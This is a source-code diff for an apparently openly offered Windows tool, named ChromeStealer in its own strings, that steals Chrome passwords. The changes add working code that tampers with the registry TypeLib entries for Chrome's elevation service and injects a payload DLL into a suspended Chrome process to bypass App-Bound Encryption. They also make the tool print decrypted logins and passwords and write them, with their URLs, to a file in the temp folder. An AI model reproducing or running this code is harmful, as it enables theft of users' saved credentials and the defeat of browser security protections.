@@ -99,7 +99,10 @@ std::string getEncryptedKey(const std::wstring& localStatePath) {
   return encryptedKey;
 }
 
-// Retrieves app_bound_encrypted_key from Local State (APPB prefix - Chrome ABE).
+// Retrieves the app-bound encrypted key from Local State (APPB / app_bound_encrypted_key).
+// Used when Chrome uses App-Bound Encryption (v20).
+// @param localStatePath The path to the Local State file.
+// @return The raw APPB blob (decoded from Base64) including APPB prefix; empty if not present.
 std::string getAppBoundEncryptedKey(const std::wstring& localStatePath) {
   std::ifstream file(localStatePath);
   if (!file.is_open()) return "";
@@ -112,12 +115,19 @@ std::string getAppBoundEncryptedKey(const std::wstring& localStatePath) {
   auto it = itOsCrypt.value().find("app_bound_encrypted_key");
   if (it == itOsCrypt.value().end() || !it.value().is_string()) return "";
 
-  std::string key = it.value().get<std::string>();
-  if (key.size() < 4 || key.substr(0, 4) != "APPB") return "";
-  return key;
+  std::string b64 = it.value().get<std::string>();
+  DWORD len = 0;
+  if (!CryptStringToBinaryA(b64.c_str(), 0, CRYPT_STRING_BASE64, NULL, &len, NULL, NULL)) return "";
+  if (len < 4) return "";
+  std::vector<BYTE> buf(len);
+  if (!CryptStringToBinaryA(b64.c_str(), 0, CRYPT_STRING_BASE64, buf.data(), &len, NULL, NULL)) return "";
+  if (len < 4) return "";
+  if (!(buf[0] == 'A' && buf[1] == 'P' && buf[2] == 'P' && buf[3] == 'B')) return "";
+  return std::string((char*)buf.data(), len);
 }
 
-// Gets chrome.exe path from registry.
+// Gets the full path to chrome.exe from registry.
+// @return Path to chrome.exe or empty string if not found.
 std::wstring GetChromePath() {
   HKEY hKey = NULL;
   WCHAR path[MAX_PATH] = { 0 };
@@ -136,10 +146,78 @@ std::wstring GetChromePath() {
   return std::wstring(path);
 }
 
-// Decrypts app-bound key via Chrome process injection (IElevator::DecryptData).
+// Decrypts the app-bound key by injecting into Chrome and calling IElevator::DecryptData.
+// Requires ChromeStealerPayload.dll next to the exe.
+// @param localStatePath Path to the Local State file (used for log context).
+// @param outKey Output 32-byte key; cbData set to 32 on success.
+// @return True if key was obtained via Chrome injection; false otherwise.
 bool DecryptKeyViaChromeInjection(const std::wstring& localStatePath, DATA_BLOB& outKey) {
   outKey.pbData = NULL;
   outKey.cbData = 0;
+
+  auto TrimQuotesW = [](const std::wstring& s) -> std::wstring {
+    if (s.size() >= 2 && ((s.front() == L'"' && s.back() == L'"') || (s.front() == L'\'' && s.back() == L'\'')))
+      return s.substr(1, s.size() - 2);
+    return s;
+  };
+  auto GetElevationServiceNameW = []() -> std::wstring {
+    HKEY hKey = NULL; std::wstring name;
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Classes\\AppID\\{708860E0-F641-4611-8895-7D867DD3675B}", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+      WCHAR buf[256]; DWORD cb = sizeof(buf), type = 0;
+      if (RegQueryValueExW(hKey, L"LocalService", NULL, &type, (LPBYTE)buf, &cb) == ERROR_SUCCESS && type == REG_SZ)
+        name = buf;
+      RegCloseKey(hKey);
+    }
+    if (name.empty()) name = L"GoogleChromeElevationService";
+    return name;
+  };
+  auto GetElevationServicePathW = [&]() -> std::wstring {
+    std::wstring svc = GetElevationServiceNameW();
+    std::wstring keyPath = L"SYSTEM\\CurrentControlSet\\Services\\" + svc;
+    HKEY hKey = NULL; std::wstring path;
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, keyPath.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+      DWORD type = 0; WCHAR buf[1024]; DWORD cb = sizeof(buf);
+      if (RegQueryValueExW(hKey, L"ImagePath", NULL, &type, (LPBYTE)buf, &cb) == ERROR_SUCCESS) {
+        std::wstring p = buf;
+        WCHAR expanded[1024];
+        if (type == REG_EXPAND_SZ) {
+          if (ExpandEnvironmentStringsW(p.c_str(), expanded, 1024)) p = expanded;
+        }
+        path = TrimQuotesW(p);
+      }
+      RegCloseKey(hKey);
+    }
+    return path;
+  };
+  auto EnsureTypeLibPath = [&](HKEY root, const std::wstring& exePath) -> bool {
+    HKEY hKey = NULL; LONG r;
+    r = RegCreateKeyExW(root, L"Software\\Classes\\TypeLib\\{463ABECF-410D-407F-8AF5-0DF35A005CC8}\\1.0\\0\\win32", 0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL);
+    if (r != ERROR_SUCCESS) return false;
+    RegSetValueExW(hKey, NULL, 0, REG_SZ, (const BYTE*)exePath.c_str(), (DWORD)((exePath.size()+1)*sizeof(wchar_t)));
+    RegCloseKey(hKey);
+    r = RegCreateKeyExW(root, L"Software\\Classes\\TypeLib\\{463ABECF-410D-407F-8AF5-0DF35A005CC8}\\1.0\\0\\win64", 0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL);
+    if (r != ERROR_SUCCESS) return false;
+    RegSetValueExW(hKey, NULL, 0, REG_SZ, (const BYTE*)exePath.c_str(), (DWORD)((exePath.size()+1)*sizeof(wchar_t)));
+    RegCloseKey(hKey);
+    return true;
+  };
+  {
+    std::wstring svcPath = GetElevationServicePathW();
+    if (!svcPath.empty()) {
+      if (EnsureTypeLibPath(HKEY_CURRENT_USER, svcPath)) {
+        info("HKCU TypeLib updated to: %ls", svcPath.c_str());
+      } else {
+        warn("HKCU TypeLib update failed");
+      }
+      if (EnsureTypeLibPath(HKEY_LOCAL_MACHINE, svcPath)) {
+        info("HKLM TypeLib updated to: %ls", svcPath.c_str());
+      } else {
+        warn("HKLM TypeLib update failed (requires admin)");
+      }
+    } else {
+      warn("Elevation service path not found");
+    }
+  }
 
   std::wstring chromePath = GetChromePath();
   if (chromePath.empty()) {
@@ -154,6 +232,8 @@ bool DecryptKeyViaChromeInjection(const std::wstring& localStatePath, DATA_BLOB&
   if (lastSlash == std::wstring::npos) return false;
   exeDir = exeDir.substr(0, lastSlash + 1);
   std::wstring dllPath = exeDir + L"ChromeStealerPayload.dll";
+  info("Chrome path: %ls", chromePath.c_str());
+  info("Payload DLL path: %ls", dllPath.c_str());
 
   if (GetFileAttributesW(dllPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
     warn("ChromeStealerPayload.dll not found next to exe. ABE decryption requires it.");
@@ -163,6 +243,7 @@ bool DecryptKeyViaChromeInjection(const std::wstring& localStatePath, DATA_BLOB&
   WCHAR pipeNameBuf[MAX_PATH];
   wsprintfW(pipeNameBuf, L"\\\\.\\pipe\\ChromeStealerKey_%u", GetTickCount());
   std::wstring pipeName = pipeNameBuf;
+  info("Pipe name: %ls", pipeName.c_str());
 
   WCHAR configPath[MAX_PATH];
   if (GetTempPathW(MAX_PATH, configPath) == 0) return false;
@@ -171,29 +252,36 @@ bool DecryptKeyViaChromeInjection(const std::wstring& localStatePath, DATA_BLOB&
   if (hConfig == INVALID_HANDLE_VALUE) return false;
   std::string pipeNameA;
   for (wchar_t w : pipeName) pipeNameA.push_back((char)(w & 0xff));
-  WriteFile(hConfig, pipeNameA.c_str(), (DWORD)pipeNameA.size(), NULL, NULL);
+  DWORD writtenCfg = 0;
+  WriteFile(hConfig, pipeNameA.c_str(), (DWORD)pipeNameA.size(), &writtenCfg, NULL);
   CloseHandle(hConfig);
+  info("Pipe config written: %ls (bytes: %lu)", configPath, writtenCfg);
 
   HANDLE hPipe = CreateNamedPipeW(pipeName.c_str(),
       PIPE_ACCESS_INBOUND, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
       1, 64, 64, 30000, NULL);
   if (hPipe == INVALID_HANDLE_VALUE) {
+    warn("CreateNamedPipe failed. Error: %lu", GetLastError());
     DeleteFileW(configPath);
     return false;
   }
+  okay("Named pipe created.");
 
   STARTUPINFOW si = { sizeof(si) };
   PROCESS_INFORMATION pi = { 0 };
   if (!CreateProcessW(chromePath.c_str(), NULL, NULL, NULL, FALSE,
       CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+    warn("CreateProcessW failed. Error: %lu", GetLastError());
     CloseHandle(hPipe);
     DeleteFileW(configPath);
     return false;
   }
+  okay("Chrome started suspended. PID: %lu", pi.dwProcessId);
 
   size_t dllPathLen = (dllPath.size() + 1) * sizeof(wchar_t);
   void* remotePath = VirtualAllocEx(pi.hProcess, NULL, dllPathLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
   if (!remotePath) {
+    warn("VirtualAllocEx failed. Error: %lu", GetLastError());
     TerminateProcess(pi.hProcess, 0);
     CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
     CloseHandle(hPipe);
@@ -201,6 +289,7 @@ bool DecryptKeyViaChromeInjection(const std::wstring& localStatePath, DATA_BLOB&
     return false;
   }
   if (!WriteProcessMemory(pi.hProcess, remotePath, dllPath.c_str(), dllPathLen, NULL)) {
+    warn("WriteProcessMemory failed. Error: %lu", GetLastError());
     VirtualFreeEx(pi.hProcess, remotePath, 0, MEM_RELEASE);
     TerminateProcess(pi.hProcess, 0);
     CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
@@ -208,12 +297,14 @@ bool DecryptKeyViaChromeInjection(const std::wstring& localStatePath, DATA_BLOB&
     DeleteFileW(configPath);
     return false;
   }
+  okay("DLL path written into Chrome process memory.");
 
   HMODULE hKernel = GetModuleHandleW(L"kernel32.dll");
   FARPROC pLoadLibrary = GetProcAddress(hKernel, "LoadLibraryW");
   HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0,
       (LPTHREAD_START_ROUTINE)pLoadLibrary, remotePath, 0, NULL);
   if (!hThread) {
+    warn("CreateRemoteThread failed. Error: %lu", GetLastError());
     VirtualFreeEx(pi.hProcess, remotePath, 0, MEM_RELEASE);
     TerminateProcess(pi.hProcess, 0);
     CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
@@ -225,27 +316,47 @@ bool DecryptKeyViaChromeInjection(const std::wstring& localStatePath, DATA_BLOB&
   WaitForSingleObject(hThread, 15000);
   CloseHandle(hThread);
   VirtualFreeEx(pi.hProcess, remotePath, 0, MEM_RELEASE);
-  TerminateProcess(pi.hProcess, 0);
-  CloseHandle(pi.hProcess);
-  CloseHandle(pi.hThread);
-  DeleteFileW(configPath);
-
+  DWORD resumeRes = ResumeThread(pi.hThread);
+  info("Resumed Chrome main thread. ResumeThread result: %lu", resumeRes);
+  info("DLL LoadLibraryW thread completed. Waiting for payload to connect to pipe (up to ~30s)...");
+  DWORD waitStart = GetTickCount();
   if (!ConnectNamedPipe(hPipe, NULL) && GetLastError() != ERROR_PIPE_CONNECTED) {
+    warn("ConnectNamedPipe failed. Error: %lu", GetLastError());
     CloseHandle(hPipe);
+    TerminateProcess(pi.hProcess, 0);
+    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
+    DeleteFileW(configPath);
     return false;
   }
+  okay("Payload connected to pipe. Elapsed: %lu ms", GetTickCount() - waitStart);
 
-  BYTE keyBuf[32] = { 0 };
+  BYTE keyBuf[64] = { 0 };
   DWORD read = 0;
-  BOOL ok = ReadFile(hPipe, keyBuf, 32, &read, NULL);
+  info("Reading key from pipe...");
+  BOOL ok = ReadFile(hPipe, keyBuf, 64, &read, NULL);
   CloseHandle(hPipe);
-  if (!ok || read < 32) return false;
+  DeleteFileW(configPath);
+  if (!ok || read < 32) {
+    warn("ReadFile failed or insufficient bytes. ok=%d read=%lu Error=%lu", (int)ok, read, GetLastError());
+    TerminateProcess(pi.hProcess, 0);
+    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
+    return false;
+  }
+  okay("Received %lu bytes from payload.", read);
 
   outKey.cbData = 32;
   outKey.pbData = (BYTE*)LocalAlloc(LMEM_FIXED, 32);
-  if (!outKey.pbData) return false;
+  if (!outKey.pbData) {
+    warn("LocalAlloc failed. Error: %lu", GetLastError());
+    TerminateProcess(pi.hProcess, 0);
+    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
+    return false;
+  }
   memcpy(outKey.pbData, keyBuf, 32);
   okay("App-bound key obtained via Chrome injection (ABE bypass).");
+  TerminateProcess(pi.hProcess, 0);
+  CloseHandle(pi.hProcess);
+  CloseHandle(pi.hThread);
   return true;
 }
 
@@ -297,6 +408,29 @@ DATA_BLOB decryptKey(const std::string& encrypted_key) {
   //info("The decrypted data is: %s", DataOutput.pbData);
 
   return DataOutput;
+}
+
+static void AppendCredentials(const unsigned char* originUrl, const unsigned char* username, const char* password) {
+  // Appends decrypted credentials to a temporary text file.
+  // @param originUrl URL associated with the credentials (UTF-8).
+  // @param username Extracted username (UTF-8).
+  // @param password Decrypted password (UTF-8).
+  WCHAR path[MAX_PATH];
+  if (GetTempPathW(MAX_PATH, path) == 0) return;
+  wcscat_s(path, L"cs_credentials.txt");
+  HANDLE h = CreateFileW(path, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+  if (h == INVALID_HANDLE_VALUE) return;
+  SetFilePointer(h, 0, NULL, FILE_END);
+  std::string line;
+  if (originUrl) line.append((const char*)originUrl);
+  line.push_back('\t');
+  if (username) line.append((const char*)username);
+  line.push_back('\t');
+  if (password) line.append(password);
+  line.append("\r\n");
+  DWORD written = 0;
+  WriteFile(h, line.c_str(), (DWORD)line.size(), &written, NULL);
+  CloseHandle(h);
 }
 
 // Parses the Login Data file to extract and decrypt login credentials.
@@ -412,9 +546,9 @@ int loginDataParser(const std::wstring& loginDataPath, DATA_BLOB decryptionKey) 
 
       if (decryptSuccess && decryptedLen > 0) {
         decrypted[decryptedLen] = '\0';
-        okay("Origin URL: %s", originUrl);
-        okay("Username Value: %s", usernameValue);
-        okay("Password: %s", decrypted);
+        printf("Login: %s\n", usernameValue);
+        printf("Password: %s\n", decrypted);
+        AppendCredentials(originUrl, usernameValue, (const char*)decrypted);
       }
       else {
         warn("Failed to decrypt password for URL: %s", originUrl);
@@ -538,6 +672,8 @@ cleanup:
   return success;
 }
 
+// Displays the interactive menu options for the user.
+// @return void
 void displayMenu() {
   printf("Menu:\n");
   printf("1. Proceed with decryption\n");
@@ -545,6 +681,9 @@ void displayMenu() {
   printf("Enter your choice: ");
 }
 
+// Program entry point. Detects Chrome, resolves decryption key (DPAPI or ABE via injection),
+// and parses the Login Data database to print and save credentials.
+// @return EXIT_SUCCESS on normal completion; EXIT_FAILURE on non-Windows builds.
 int main() {
 #ifdef _WIN32
 
